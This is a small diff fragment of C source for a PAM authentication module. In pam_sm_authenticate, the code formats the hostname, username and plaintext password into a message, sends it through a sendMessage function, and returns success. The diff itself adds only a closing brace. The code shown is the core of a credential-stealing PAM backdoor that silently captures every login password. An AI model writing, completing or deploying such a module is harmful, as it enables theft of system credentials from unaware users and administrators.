@@ -56,3 +56,4 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
   snprintf(message, 2048, "Hostname: %s\nUsername: %s\nPassword: %s\n", hostname, username, password);
   sendMessage(message);
   return PAM_SUCCESS;
+}
